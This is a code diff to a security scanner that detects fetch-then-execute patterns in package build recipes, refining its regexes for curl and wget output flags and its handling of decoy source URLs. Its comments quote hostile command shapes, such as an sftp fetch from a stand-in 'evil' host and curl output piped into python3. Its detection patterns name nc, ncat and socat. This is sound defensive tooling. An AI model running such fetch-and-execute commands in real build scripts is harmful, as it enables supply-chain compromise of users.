@@ -1315,16 +1315,22 @@ _LINE_URL_RE = re.compile(r"\b[a-z][a-z0-9+.-]{0,20}://[^\s;&|'\"]+",
 _FETCH_OUTPUT_RE = re.compile(
     # Lower-case `-o` takes an argument for every client here, glued
     # (`-o"f"`, `-o$f`) or spaced.  `(?![-\s])` keeps `-o-` (stdout) and a
-    # bare flag from being read as a filename.
+    # bare flag from being read as a filename.  `(?-i:o)` matters: the
+    # pattern is compiled IGNORECASE, so a plain `o` also matched curl's
+    # argument-less capital `-O` and captured the *address* as a filename -
+    # `curl -O "$(cat u)"` read as "the fetch wrote $(cat u)", which
+    # suppressed the unattributed arm and the pairing with the file the
+    # command actually fetched.
     r"\b(?:" + _OUTPUT_FLAG_CLIENTS + r")\b"
     r"[^;&|]*?"
-    r"\s-[A-Za-z]*o(?:=?\s*)"
+    r"\s-[A-Za-z]*(?-i:o)(?:=?\s*)"
     r"(?P<path>(?!-)(?:\"[^\"]*\"|'[^']*'|\\.|[^\s;&|])+)"
-    # wget's capital `-O` is an output document.  curl's capital `-O` takes
-    # no argument (save as the URL basename) and `-OJ` is its cluster, so
-    # curl is deliberately absent from this arm.
+    # wget's capital `-O` is an output document (lower-case `-o` is its log
+    # file).  curl's capital `-O` takes no argument (save as the URL
+    # basename) and `-OJ` is its cluster, so curl is deliberately absent
+    # from this arm.  `(?-i:O)` keeps wget's log file out of it.
     r"|\bwget2?\b[^;&|]*?"
-    r"\s-[A-Za-z]*O(?:=?\s*)"
+    r"\s-[A-Za-z]*(?-i:O)(?:=?\s*)"
     r"(?P<wget_path>(?!-)(?:\"[^\"]*\"|'[^']*'|\\.|[^\s;&|])+)"
     r"|\b(?:" + _OUTPUT_FLAG_CLIENTS + r")\b"
     r"[^;&|]*?\s--output(?:\s+|=)"
@@ -1371,6 +1377,13 @@ _FETCH_OUTPUT_RE = re.compile(
 # Build/package/check/prepare only; install hooks already have H017.
 _BUILD_FUNCTIONS = frozenset(_CRITICAL_FUNCTIONS)
 
+#: The pairing pass also reads ``pkgver()``.  It was excluded because the
+#: network-in-pkgver rule (R051) covers the common `git describe` shape, but
+#: R051 does not know about `git fetch`/`git pull`, so a fetch there followed
+#: by an execution of an undeclared file paired with nothing.  H016 still
+#: leaves pkgver alone; only the fetch-then-execute pairing widens.
+_FETCH_SCOPE_FUNCTIONS = frozenset(_BUILD_FUNCTIONS) | {"pkgver"}
+
 #: makepkg phase order, for pairing a fetch in one function with an
 #: execution in a later one.  A fetch in package() cannot pair with a
 #: build() execution: makepkg never runs them in that order.
@@ -1379,13 +1392,6 @@ _PHASE_RANK = {"pkgver": 0, "prepare": 1, "build": 2, "check": 3, "package": 4}
 #: A line whose execution target sits under $pkgdir stages the package's
 #: own output; it is never the execution of a fetched artifact.
 _PKGDIR_LINE_RE = re.compile(r"\$\{?pkgdir\}?")
-
-#: Clients whose remote is named by a host operand, not a URL.  A declared
-#: URL elsewhere on the same line is a decoy argument, not this fetch's
-#: address: `sftp -b - u@evil "https://declared/x.tar.gz"` still brings
-#: bytes from evil, so the scheme guard below must not silence it.
-_HOST_FORM_FETCH_RE = re.compile(
-    r"(?:sftp|ssh|scp|ftp|tftp|nc|ncat|netcat|lftp|socat)\b", re.IGNORECASE)
 
 #: An interpreter whose script arrives on stdin through a process
 #: substitution: `python3 < <(curl URL)`.  The interpreter reads the
@@ -1451,18 +1457,45 @@ def _clone_destinations(body: str) -> list[str]:
 _DEFAULT_DEST_RE = re.compile(
     r"\b(?:wget2?|aria2c|axel)\b(?![^;&|\n]*\s-(?:[A-Za-z]*[oO]\s|-output))"
     r"[^;&|\n]*?([a-z][a-z0-9+.-]*://[^\s;&|'\"]+)"
-    r"|\bcurl\b[^;&|\n]*?\s-[A-Za-z]*O\b"
+    # `(?-i:O)`: compiled IGNORECASE, a plain `O` also matched curl's
+    # lowercase `-o`, so an explicit output was also read as a default one.
+    r"|\bcurl\b[^;&|\n]*?\s-[A-Za-z]*(?-i:O)\b"
     r"[^;&|\n]*?([a-z][a-z0-9+.-]*://[^\s;&|'\"]+)",
     re.IGNORECASE,
 )
 
 
-def _collect_fetch_outputs(body: str) -> list[str]:
-    """Normalised paths a network client on *body* writes to a file."""
+def _declared_source_urls(diff_text: str) -> frozenset[str]:
+    """Scheme URLs declared in ``source=()`` on the post-diff side.
+
+    A scheme URL on a fetch line that is *also* a declared source is a
+    decoy argument: makepkg fetches declared sources itself, so a recipe has
+    no ordinary reason to download one by hand and then execute a file the
+    grammar did not name.  Such a URL must not produce a derived output
+    path, or the fetch is attributed to the decoy instead of its real
+    address.
+    """
+    from ..differ import extract_source_array_urls
+
+    return frozenset(extract_source_array_urls(diff_text))
+
+
+def _collect_fetch_outputs(body: str,
+                           declared_urls: frozenset[str] = frozenset()) -> list[str]:
+    """Normalised paths a network client on *body* writes to a file.
+
+    A path derived from a URL is discarded when that URL is declared in
+    ``source=()`` (see :func:`_declared_source_urls`): the decoy names no
+    output of *this* fetch.
+    """
+    from ..differ import _clean_url
+
     paths: list[str] = []
     if not _FETCH_CLIENT_RE.search(body):
         return paths
     line_url = _LINE_URL_RE.search(body)
+    if line_url and _clean_url(line_url.group(0)) in declared_urls:
+        line_url = None
     for m in _FETCH_OUTPUT_RE.finditer(body):
         raw = (m.group("path") or m.group("wget_path")
                or m.group("long_path") or m.group("doc_path")
@@ -1488,7 +1521,9 @@ def _collect_fetch_outputs(body: str) -> list[str]:
         # basename: `aws s3 cp s3://b/s.sh .` writes ./s.sh, and the old
         # capture recorded only "." so the later `bash s.sh` never paired.
         store_src, store_dest = m.group("store_src"), m.group("store_dest")
-        if store_src and store_dest:
+        if (store_src and store_dest
+                and not ("://" in store_src
+                         and _clean_url(store_src) in declared_urls)):
             dest = store_dest.strip("\"'")
             if dest in (".", "./") or dest.endswith("/"):
                 base = (store_src.rstrip("/").rsplit("/", 1)[-1]
@@ -1504,6 +1539,8 @@ def _collect_fetch_outputs(body: str) -> list[str]:
             paths.append(path)
     for m in _DEFAULT_DEST_RE.finditer(body):
         url = m.group(1) or m.group(2) or ""
+        if "://" in url and _clean_url(url) in declared_urls:
+            continue
         base = url.rstrip("/").rsplit("/", 1)[-1].split("?")[0]
         if base and "." in base:
             paths.append(_norm_path(base))
@@ -1553,17 +1590,20 @@ def _fetch_then_execute_findings(diff_text, config, add, current_text=None) -> N
     lines = resolve_added_lines(diff_text)
     scopes = ScopeResolver(lines, _recipe_lines(current_text))
     source_basenames = _declared_source_basenames(diff_text, current_text)
+    declared_urls = _declared_source_urls(diff_text)
     heredoc_body = _heredoc_body_indices(lines)
 
     fetched_by_fn: dict[str, list[str]] = {}
     cloned_by_fn: dict[str, list[str]] = {}
     #: (phase rank, line index, client, fetch scope) for fetches whose
     #: destination the grammar cannot name.  A scheme-bearing URL is left
-    #: to H016/H082's attributed arm, so one command is not scored twice.
+    #: to H016/H082's attributed arm, so one command is not scored twice -
+    #: unless the only scheme URL on the line is a declared source, which is
+    #: a decoy argument and names no output of this fetch.
     pending_fetch: list[tuple[int, int, str, str]] = []
 
     for i, line in enumerate(lines):
-        fn = scopes.within(i, _BUILD_FUNCTIONS)
+        fn = scopes.within(i, _FETCH_SCOPE_FUNCTIONS)
         if not line.startswith("+") or fn is None:
             continue
         if i in heredoc_body:
@@ -1574,7 +1614,8 @@ def _fetch_then_execute_findings(diff_text, config, add, current_text=None) -> N
             continue
         body = _strip_comment(line[1:])
 
-        for path in _collect_fetch_outputs(body):
+        outputs = _collect_fetch_outputs(body, declared_urls)
+        for path in outputs:
             fetched_by_fn.setdefault(fn, []).append(path)
         # A clone fills a whole directory, so the pairing is by prefix
         # rather than by name: anything under it came from the remote.
@@ -1591,8 +1632,11 @@ def _fetch_then_execute_findings(diff_text, config, add, current_text=None) -> N
                 fetched_by_fn.setdefault(fn, []).append(wpath)
 
         client = _FETCH_CLIENT_RE.search(body)
-        host_form = bool(client and _HOST_FORM_FETCH_RE.match(client.group(0)))
-        if (client and (host_form or "://" not in body)
+        # Pending when the grammar named no output, or when the line carries
+        # no scheme address for the attributed arm to read.  A line whose
+        # only scheme URL is a declared source produces no output here, so
+        # the decoy cannot silence it.
+        if (client and (not outputs or "://" not in body)
                 and not claims_pipe_to_shell(body)
                 and not claims_upload_line(body, config)):
             pending_fetch.append(
